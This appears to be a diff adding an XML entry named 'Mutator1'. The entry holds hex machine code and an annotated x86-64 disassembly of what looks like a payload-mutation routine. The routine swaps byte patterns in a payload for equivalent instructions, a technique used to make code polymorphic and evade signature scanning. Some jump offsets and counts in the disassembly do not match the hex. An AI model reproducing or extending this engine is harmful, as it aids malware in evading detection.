@@ -1,0 +1,57 @@
+<odo>
+	<name>Mutator1</name>
+	<description>Description of Mutator1</description>
+	<code>E8FBFDFFFFB808000000BB10244000B9FF010000CD8089C3B806000000CD80B805000000BB00244000B900000000BAFF010000CD8089C353B803000000B968244000668B142560244000CD80B8060000005BCD80FE042576484000FE04258648400031F6BE002040004831C9B9000200004831C066AD4831DB89C351564831F64831C9BEED224000B9060000004831C066AD39D8751831C08B460A31DB5B89DA83EA0281C2682400005366678902E2DD5E5948FFCEE2BAB805000000BB10244000B902000000BAFF010000CD8089C353B804000000B968244000668B142560244000CD80B8060000005BCD80C331C031DB31C931D231F689D829C029DB29C929D229F65358</code>
+	<disassemble>
+		call payload 			; E8FBFDFFFF
+		xor esi, esi			; 31F6
+		mov esi, payload		; BE00204000
+		xor rcx, rcx			; 4831C9
+		mov ecx, payload_size	; B900020000
+		
+		loop1:
+			xor rax, rax		; 4831C0
+			lodsw				; 66AD
+			xor rbx, rbx		; 4831DB
+			mov ebx, eax		; 89C3
+			
+			push rcx			; 51
+			push rsi			; 56
+			xor rsi, rsi		; 4831F6
+			xor rcx, rcx		; 4831C9
+			mov esi, mutator	; BEED224000 	<- CHANGE
+			mov ecx, 1			; B901000000			<- CHANGE
+			loop2:
+				xor rax, rax	; 4831C0
+				lodsw			; 66AD
+
+				cmp eax, ebx	; 39D8
+				jne midloop		; 7512
+				
+				xor eax, eax		; 31C0
+				mov eax, [rsi+2]	; 8B4602  -> needs to be increased based on size of comparisons
+				xor ebx, ebx		; 31DB
+				pop rbx				; 5B
+				mov edx, ebx		; 89DA
+				sub edx, 2			; 83EA02
+				add edx, 0402468h	; 81C268240000
+				push rbx			; 53
+				mov [edx], ax		; 66678902
+				
+				midloop:
+				loop loop2			; E2E3
+			
+			pop rsi					; 5E
+			pop rcx					; 59
+			dec rsi					; 48FFCE
+			loop loop1				; E2C0
+			
+			call payload 			; E84AFDFFFF
+			
+			ret 					; C3
+			31C031DB31C931D231F689D829C029DB29C929D229F65358
+			29C029DB29C929D229F65358
+			db 031h, 0C0h, 031h, 0DBh, 031h, 0C9h, 031h, 0D2h, 031h, 0F6h, 089h, 0D8h
+			db 029h, 0C0h, 029h, 0DBh, 029h, 0C9h, 029h, 0D2h, 029h, 0F6h, 053h, 058h
+	</disassemble>
+</odo>
